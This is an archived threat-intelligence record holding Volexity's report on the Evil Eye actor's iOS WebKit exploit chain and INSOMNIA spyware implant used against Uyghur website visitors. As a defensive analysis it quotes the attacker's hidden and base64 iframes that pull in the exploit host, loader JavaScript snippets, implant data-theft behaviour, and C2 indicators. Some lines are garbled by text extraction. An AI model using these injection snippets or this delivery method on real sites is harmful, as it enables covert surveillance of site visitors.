{
    "id": "fe1c7004-ca89-41d7-9510-df27b1e8acb1",
    "created_at": "2023-01-12T15:02:54.398259Z",
    "updated_at": "2025-03-27T02:15:10.65003Z",
    "deleted_at": null,
    "sha1_hash": "90cdee0abcba61718cdb3c07e03ec5717ca7206a",
    "title": "2020-04-21 - Evil Eye Threat Actor Resurfaces with iOS Exploit and Updated Implant",
    "authors": "",
    "file_creation_date": "2022-05-27T22:15:44Z",
    "file_modification_date": "2022-05-27T22:15:44Z",
    "file_size": 868707,
    "plain_text": "# Evil Eye Threat Actor Resurfaces with iOS Exploit and Updated Implant\n\n**[volexity.com/blog/2020/04/21/evil-eye-threat-actor-resurfaces-with-ios-exploit-and-updated-implant/](https://www.volexity.com/blog/2020/04/21/evil-eye-threat-actor-resurfaces-with-ios-exploit-and-updated-implant/)**\n\nApril 21, 2020\n\nby Andrew Case, Dave Lassalle, Matthew Meltzer, Sean Koessel, Steven Adair, Thomas Lancaster\n\n[In September 2019, Volexity published Digital Crackdown: Large-Scale Surveillance and Exploitation of Uyghurs, which described a series of](https://www.volexity.com/blog/2019/09/02/digital-crackdown-large-scale-surveillance-and-exploitation-of-uyghurs/)\nattacks against Uyghurs from multiple Chinese APT actors. The most notable threat actor detailed in the blog was one Volexity calls Evil Eye.\nThe Evil Eye threat actor was observed launching an exploit aimed at installing a malware implant on Android phones. Volexity also believed\n[this was likely the same group responsible for the launching exploits aimed at installing an iOS implant as described by Google's Project Zero.](https://googleprojectzero.blogspot.com/2019/08/a-very-deep-dive-into-ios-exploit.html)\nImmediately after the publications from Google and Volexity, the Evil Eye threat actor went fairly quiet. They removed their malicious code from\ncompromised websites, command and control (C2) servers were taken down, and various hostnames stopped resolving. This largely remained\nthe case until early January 2020, when Volexity observed a series of new activity across multiple previously compromised Uyghur websites.\n\n[In the latest activity identified by Volexity, the Evil Eye threat actor used an open source framework called IRONSQUIRREL to launch their](https://github.com/MRGEffitas/Ironsquirrel)\nexploit chain. The exploits used targeted Apple iOS operating systems leveraging a vulnerability in WebKit that appears to have been patched\nin the summer of 2019. The exploit works against iOS versions 12.3, 12.3.1, and 12.3.2. These versions of iOS are newer than anything\nmentioned in the Google Project Zero blog, or any other recently published reports involving weaponized exploits that can be used remotely\nagainst iPhones or iPads. If the exploit is successful, a new version of the implant described by Google will be installed onto the device.\nVolexity refers to this implant by the name INSOMNIA.\n\nVolexity observed multiple different attacks where this implant was being installed on iOS devices. This includes six different exploit websites;\nfive instances of the malware implant; three different C2 IP and port pair combination; and two unique C2 IP addresses. Each of the observed\nexploit sites and malware C2 servers are detailed in Appendix A below.\n\n## Targeting Website Visitors\n\nThe Evil Eye actor set up IRONSQUIRREL code to be loaded in a variety of different ways through malicious iframes across the various\ncompromised websites. Volexity observed a total of six different hostnames being used to launch attacks between January and March 2020.\n\nWhile the first round of attacks were identified across several websites, future attacks were only observed in conjunction with the Uyghur\nAcademy website. The attacks were largely loaded in fairly standard ways, such as via an iframe on a website's index, a modified JavaScript\nfile used by the website, or nested iframes—which was the case on the Uyghur Academy website. The code below has been on the main\nindex of the Uyghur Academy website for several months. The \"JPlayer.html\" file appears to be exclusively used by the Evil Eye actor when\nthey want to launch attacks against visitors to the website. Otherwise, the file is either deleted or emptied out when not in use.\n\n<iframe src=\"https://akademiye[.]org/ug/wp-content/themes/goodnews/js/Jplayer.html\" width=\"0\" height=\"0\"></iframe>\n\nIn the first observed example of this iOS exploit actvity, the following code was observed inside Jplayer.html.\n\n\n-----\n\na e s c ttps //cd doub esc c [ ] e/ de t dt 0 e g t 0 / a e\n\nThe most notable method of loading the code was via an iframe that was observed on the Chinese-language version of the Uighur Times\nwebsite. The following code was observed.\n\n<divstyle=\"display: none\">\n<iframe\nsrc=\"data:text/html;base64,PGh0bWw+PGhlYWQ+PGJvZHk+PGlmcmFtZSBzcmM9Imh0dHBzOi8vY2RuLmRvdWJsZXNjbGljay5tZS9pbmRle\n</iframe>\n</div>\n\nHere, the entire iframe has been obfuscated by using base64 encoding, which is a common method to embed images in the source of\nwebsites. However, it is far less common to see an iframe load content from a remote website; this may be used as an indicator of suspect\nactivity. The base64 content in this iframe decodes as follows:\n\n<html><head><body><iframe src=\"https://cdn.doublesclick[.]me/index.html\"></iframe></body></head></html>\n\n## Targeting Website Visitors\n\nThe index.html file hosted on cdn.doublesclick[.]me would kick off the first step in potential targeting against the user. The response returned\nby the server would depend on the User-Agent of the visitor making the request. An exploit chain would be kicked off if the right User-Agent\nstring was detected; otherwise, the server would simply respond with the text \"ok\".\n\nAs an example, the following User-Agent strings would result in the exploit chain being launched.\n\nMozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.1.1\nEdgiOS/44.5.0.10 Mobile/15E148 Safari/604.1\n\nMozilla/5.0 (iPad; 12_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 EdgiOS/44.5.2 Mobile/15E148\nSafari/605.1.15CPU OS 1\n\nNote that exploit can be triggered through any browser on the phone, as they all use WebKit. Volexity was able to confirm successful\nexplotiation of a phone running 12.3.1 via the Apple Safari, Google Chrome, and Microsoft Edge mobile browsers. If a visiting device passes\nthe first checks put in place by Evil Eye, code similar to the following would be returned:\n\n<html xmlns=\"http://www.w3.org/1999/xhtml\">\n\n<head>\n\n<meta content=\"text/html;charset=utf-8\" http-equiv=\"Content-Type\">\n\n<meta content=\"utf-8\" http-equiv=\"encoding\">\n\n<title>data list</title>\n\n</head>\n\n<body onload=\"myfunction()\">\n\n<script>\n\nfunction myfunction(){\n\nsettings();\n\nsave_data();\n\n}\n</script>\n\n<script type=\"text/javascript\" src=\"js/s.js?rid=V3KUMVZACLINY324HKVW7CI2EXF3ALPBONLGL23ZP3IKMZ6DVOBA\"></script>\n\n<script type=\"text/javascript\" src=\"js/jquery.js?rid=V3KUMVZACLINY324HKVW7CI2EXF3ALPBONLGL23ZP3IKMZ6DVOBA\"></script>\n\n</body>\n\n</html>\n\nThe file jquery.js contains the main logic and the server's public key, while the file s.js contains the supporting Stanford JavaScript Crypto\nLibrary used to generate a client key pair. This client public key is passed as a variable into the loading of the final JavaScript.\n\nfunction goto_application(client_pub_g) {\n\ndocument.write('\\x3Cscript type=\"text/javascript\" src=\"application?\nrid=VGXBJK2MFSGLRKQS7PZVJ2L5ZP3XTZPTDSFFYZYBFQPZBTBFKRJQ&cl='+ encodeURIComponent(client_pub_g)+\n'\">\\x3C/script>');\n\n}\n\nThe JavaScript served by the \"application\" request contains the following key functions/variables:\n\n\n-----\n\nFunction or variable Purpose\n\nvar load_macho Contains the malicious app to be dropped\n\n\nfunction\nversion_is_supported()\n\n\nChecks if version of iOS (based on User-Agent) is suitable for exploit (return \"12_3_2\" == r || \"12_3_1\" == r ||\n\"12_3\" == r)\n\n\nfunction exp() [Responsible for running the exploit, similar to this code](http://rce.party/wtf.js)\n\nfunction stage_stable() [Prepares a fake object for the exploit, in a similar way to this](https://blog.ret2.io/2018/07/11/pwn2own-2018-jsc-exploit/)\n\nfunction stage_final() Responsible for building the Mach-O from the hex array & prepares the memory space to drop it in\n\nIf each step of the JavaScript above is successful, it results in a Mach-O binary running on the phone. This application contains an iOS exploit\nfor the targeted version and another Mach-O binary, the INSOMNIA implant, embedded in it.\n\nSuccessful iOS exploitation results in the INSOMNIA implant being written to the device at /tmp/updateserver. The implant is then started with\nthe \"run\" command-line argument. It runs as root with various entitlements, giving it access to all the data the Evil Eye actor wishes to collect.\n\nVolexity has conducted an initial analysis of the payload delivered through the exploit chain and has been able to confirm successful\nexploitation of an iPhone running iOS 12.3.1. An overview of this entire chain is shown in the Figure below:\n\n## INSOMNIA Implant Analysis\n\nFurther analysis of the malicious binary indicates it appears to be an updated version of the implant described by Google's Project Zero in their\n[Implant Teardown post, which was an updated version of what CitizenLab later described here. The differences and updates are summarized](https://googleprojectzero.blogspot.com/2019/08/implant-teardown.html)\nas follows:\n\nNew hard-coded IP addresses and ports were found in the malware implants.\nAll C2 communication is now done securely over HTTPS. This encrypts all C2 activity, to include data exfiltration.\nThe malware conducts C2 server validation using a certificate embedded in the malware and will not function if validation fails.\nThe malware employs basic obfuscation techniques to obscure some of its embedded strings.\nThe encrypted messaging and secure e-mail applications Signal and Protonmail have been added to the list of apps that are specifically\ntargeted by the malware.\nIn addition to exfiltrating information about the phone and targeted apps, the malware now automatically sends information about each\nadditional app that is installed on the device during its initial phone-home.\n\nNote that Volexity does not have copies of the exact files analyzed by Project Zero or CitizenLab, so the differences listed above are based on\nthe published reports.\n\n### Obfuscated Strings\n\n\n-----\n\ne p a t ade e te s e use o ob uscated st gs to de e a es, a es, U pa a ete s, a d ot e data e e a t to ts\noperations. These strings were obfuscated by a routine that used a string-specific XOR key and length. The following screenshot shows the\n[decompilation of this routine inside of Ghidra.](https://ghidra-sre.org/)\n\nStepping through this code, the routine takes a pointer to an encrypted string's data structure as an argument.\n\nOn line 7, it first checks if the string has already been decrypted (offset 0x14).\nIf it has not, then it checks that the length is greater than 0 on line 8 (offset 0x10).\nIt then loops for each character in the obfuscated string and deobfuscates with XOR. The pointer to the string is stored at offset 8, and\nthe one byte XOR key to use is stored at offset 0 of the data structure. To aid in our analysis, we developed a script that brute-force\ndecrypted every string in the binary in one pass.\n\n### Malware Communication\n\nOne of the main criticisms Project Zero made of the attackers was the lack of encryption used by the malware during their operations:\n\nThere's something thus far which is conspicuous only by its absence: is any of this encrypted? The short answer is no: they really do\nPOST everything via HTTP (not HTTPS) and there is no asymmetric (or even symmetric) encryption applied to the data which is\nuploaded.\n\nThe attackers appear to have addressed this and added HTTPS communication capabilities to their malware. To allow the malicious\napplication to use a self-signed certificate, the malware developers embedded the webserver's public x509 certificate inside of the executable.\n[This certificate is hardcoded in the _mach_h section of the __DATA segment. The malware uses the getsectiondata API in order to retrieve the](http://www.dpldocs.info/experimental-docs/core.sys.darwin.mach.getsect.getsectiondata.html)\ncertificate at runtime.\n\n[The embedded certificate is stored in the DER (binary) format; at runtime, the certificate is passed to the SecCertificateCreateWithData API](https://developer.apple.com/documentation/security/1396073-seccertificatecreatewithdata)\n[inside of the malware's didReceiveAuthenticationChallenge handler. As documented nicely in a developer's blog post and by](https://developer.apple.com/documentation/foundation/nsurlsessiontaskdelegate/1411595-urlsession) [Apple, this](https://developer.apple.com/documentation/foundation/url_loading_system/handling_an_authentication_challenge/performing_manual_server_trust_authentication)\nprocess allows for applications to override the system's built-in handling of certificates, and to provide their own authentication for the\napplication's self-signed certificates. This is actually the way Apple recommends to use self-signed certificates during development, and the\nmalware is abusing it for its own purposes. Appendix C contains the human-readable form of the certificate embedded in our analyzed binary.\n\nThe use of a specific certificate and SSL verification means that the malware will not talk to just any listening HTTPS server, which adds\ncomplexity to analyzing INSOMNIA in a sandbox environment. To allow the malware to communicate with Volexity's custom server\nimplementation, it was necessary to \"trick\" the malware into trusting the server we had set up to act as the C2. Since Volexity did not have\naccess to the private key of the certificate originally embedded in the malware another solution had to be identified The chosen solution was\n\n\n-----\n\nto ed t t e a a e d ect y a d to ep ace t e e bedded ce t cate t o e t at e c eated s as do e by o e t g t e ce t cate\nthe binary and updating the mach_h section size header to match the length of the new certificate. Once safely replaced, the malware trusted\nthe sandbox server and began communication.\n\nWith the malware successfully communicating with the Volexity C2 server, we were able to inspect the data stolen from our dummy device. As\nper previous write-ups of this malware, the data transferred is not encrypted (except for the HTTPS), so we can easily look at the data stolen.\nSince this has already been done in depth in the Project Zero write-up, we will not go over it again here, with the exception of the stolen Signal\ndata. The data stolen from the Signal app is as follows:\n\nImages transferred using Signal (these are unencrypted on the phone)\nA copy of the messages, stored in an SQLite3 database (these are encrypted on the phone)\n\nThe messages require a key from the phones keychain in order to be successfully decrypted. In the Volexity test environment, the required key\nwas not automatically exfiltrated, perhaps showing a shortcoming in the attackers' thinking.\n\nOver time, the IP addresses the malware was configured to communicate with, ports, and certificates used to verify the server were modified.\n\n### Functionality & Targeted Applications\n\nAs described in the Project Zero and CitizenLab posts, the malware contains a list of applications for which it will steal data automatically if\nthey are installed. Since the last analysis, the following applications have been added to this list:\n\nSignal (org.whispersystems.signal)\nProtonMail (ch.protonmail.protonmail)\n\nThe inclusion of these apps suggests they are being more commonly used by the Uyghur community than before. In particular, the inclusion of\nSignal and ProtonMail may suggest that the Uyghurs are aware of potential monitoring of their communications and are attempting to use\napplications with strong security features to avoid this. It is also worth noting that this implant also targets the popular messaging app WeChat.\nThis app is referenced as \"com.tencent.xin\" in other write-ups, but it is not mentioned as WeChat.\n\nVolexity also noted that the malware has no mechanism for persistence. This indicates that the attackers must work quickly to obtain data that\nthey want from a device before it reboots, or that they may potentially rely on the ability to reinfect a phone. Alternatively, it may be possible the\nattackers have a method to maintain persistence but only set this up manually after verifying the target.\n\n## Conclusion\n\nEven though the vulnerabilities exploited in this report are patched as of July 2019 with iOS version 12.4 and newer, it appears that Evil Eye is\nlikely having success with these attacks. According to Apple's own statistics from its website:\n\n43% of iPad devices using the App store use iOS 12 or earlier\n30% of iPhone devices using the App store use iOS 12 or earlier\n\nThis represents a considerable attack surface of potentially vulnerable devices.\n\nAs noted in September 2019, Volexity suspected that the Evil Eye attackers had also targeted iPhones based on the attackers' C2 servers\ngoing offline shortly after Project Zero's findings were made public. These more recent findings confirm the suspicion that the attackers were\nindeed likely the same. It can now be confirmed that in the past six months, Uyghur sites have led to malware for all major platforms,\nrepresenting a considerable development and upkeep effort by the attackers to spy on the Uyghur population.\n\n## Appendix A - Network Indicators\n\nIOC Type Value Description\n\nIP Address 154.85.32.52 C2 for iOS implant observed on TCP ports 43223 and 43773\n\nIP Address 154.85.37.250 C2 for iOS implant observed on TCP port 43111\n\nHostname static.doublesclick.info IRONSQUIRREL exploit hostname\n\nHostname cdn.doublesclick.me IRONSQUIRREL exploit hostname\n\nHostname api.doubles.click IRONSQUIRREL exploit hostname\n\nHostname status.search-sslkey-flush.com IRONSQUIRREL exploit hostname\n\nHostname start.apiforssl.com IRONSQUIRREL exploit hostname\n\nHostname status.verifyingbycf.com IRONSQUIRREL exploit hostname\n\nIP Address 154.85.33.48 Resolution for malicious hostname\n\n\n-----\n\nIP Address 154.85.34.49 Resolution for malicious hostname\n\nIP Address 154.85.34.214 Resolution for malicious hostname\n\nIP Address 154.85.34.19 Resolution for malicious hostname\n\nHostname 154.85.35.1 Resolution for malicious hostname\n\n## Appendix B - INSOMNIA Implant Hashes\n\nSHA256 Description\n\nc9320a9dc97adbe96c088d3f5ddf3f9275124137f0bf200fdd7160f47c5dcf1a Executed as /tmp/updateserver with C2 at\n154.85.32.52:43223\n\na8dd8caaeb43d693ececf096bc6fe6c7cbf1ce513cfe33de4224c5c30661a4e3 Executed as /tmp/updateserver with C2\n154.85.32.52:43773\n\n20827a607bacca9119b6fa471b37d6c751664900e68e50e28b734353c36f0d0c Executed as /tmp/updateserver with C2\n154.85.37.250:43111\n\nc8961483c7197aa0f352b2fd007412e88723fd5af4f64788aa1ce48a0999bd38 Executed as /tmp/updateserver with C2\n154.85.32.52:43773\n\n9518c66b9b568c0f00f9540b961a40529e38c0d723bd800a9c33a043e6b746f6 Executed as /tmp/updateserver with C2\n154.85.32.52:43773\n\n## Appendix C - Embedded Certificate\n\nSerial Number: 1111444412586956902 (0xf6ca4cdf7d69866)\n\nSignature Algorithm: sha256WithRSAEncryption\n\nIssuer: C=US, O=xLq, OU=www.xzXW.com, CN=XdM Root CA\n\nValidity\n\nNot Before: Dec 24 22:03:30 2019 GMT\n\nNot After : Dec 24 22:03:30 2039 GMT\n\nSubject: C=US, O=xLq, OU=www.xzXW.com, CN=XdM Root CA\n\nSerial Number: 2330826125403043443 (0x2058c20305d93673)\n\nSignature Algorithm: sha256WithRSAEncryption\n\nIssuer: C=US, O=SsT, OU=www.p83.com, CN=3fbW Root CA\n\nValidity\n\nNot Before: Jan 20 17:02:26 2020 GMT\n\nNot After : Jan 20 17:02:26 2040 GMT\n\nSubject: C=US, O=SsT, OU=www.p83.com, CN=3fbW Root CA\n\nSerial Number: 1152440617419100323 (0xffe4aa2b9ff50a3)\n\nSignature Algorithm: sha256WithRSAEncryption\n\nIssuer: C=US, O=CD6, OU=www.bUjS0F.com, CN=i4v Root CA\n\nValidity\n\nNot Before: Feb 2 19:44:45 2020 GMT\n\nNot After : Feb 2 19:44:45 2040 GMT\n\nSubject: C=US, O=CD6, OU=www.bUjS0F.com, CN=i4v Root CA\n\nSerial Number: 2340440485700108803 (0x207aea38b8190203)\n\nSignature Algorithm: sha256WithRSAEncryption\n\nIssuer: C=US, O=sCO, OU=www.w2j082Q.com, CN=4VNf Root CA\n\nValidity\n\nNot Before: Mar 13 17:29:21 2020 GMT\n\nNot After : Mar 13 17:29:21 2040 GMT\n\nSubject: C=US, O=sCO, OU=www.w2j082Q.com, CN=4VNf Root CA\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-04-21 - Evil Eye Threat Actor Resurfaces with iOS Exploit and Updated Implant.pdf"
    ],
    "report_names": [
        "2020-04-21 - Evil Eye Threat Actor Resurfaces with iOS Exploit and Updated Implant.pdf"
    ],
    "threat_actors": [
        {
            "id": "f0ebaf6d-5e1a-4ed7-aa2c-0e69a648acea",
            "created_at": "2022-10-25T16:07:23.597455Z",
            "updated_at": "2025-03-27T02:02:09.881507Z",
            "deleted_at": null,
            "main_name": "Evil Eye",
            "aliases": [],
            "source_name": "ETDA:Evil Eye",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d2a5c949-7ae0-4610-8bb8-047ab03b1574",
            "created_at": "2022-10-25T16:07:24.064197Z",
            "updated_at": "2025-03-27T02:02:10.096487Z",
            "deleted_at": null,
            "main_name": "Poison Carp",
            "aliases": [
                "Earth Empusa",
                "Evil Eye",
                "EvilBamboo",
                "Poison Carp",
                "Red Dev 16"
            ],
            "source_name": "ETDA:Poison Carp",
            "tools": [
                "ActionSpy",
                "AxeSpy",
                "BADSIGNAL",
                "BADSOLAR",
                "BadBazaar",
                "IRONSQUIRREL",
                "IceCube",
                "MOONSHINE",
                "PoisonCarp"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "52973e5f-9656-4b60-b7f8-457e32ac4bbe",
            "created_at": "2023-01-06T13:46:39.056888Z",
            "updated_at": "2025-03-27T02:00:02.986693Z",
            "deleted_at": null,
            "main_name": "POISON CARP",
            "aliases": [
                "Evil Eye",
                "Red Dev 16",
                "Earth Empusa"
            ],
            "source_name": "MISPGALAXY:POISON CARP",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535774,
    "ts_updated_at": 1743041710,
    "ts_creation_date": 1653689744,
    "ts_modification_date": 1653689744,
    "files": {
        "pdf": "https://archive.orkl.eu/90cdee0abcba61718cdb3c07e03ec5717ca7206a.pdf",
        "text": "https://archive.orkl.eu/90cdee0abcba61718cdb3c07e03ec5717ca7206a.txt",
        "img": "https://archive.orkl.eu/90cdee0abcba61718cdb3c07e03ec5717ca7206a.jpg"
    }
}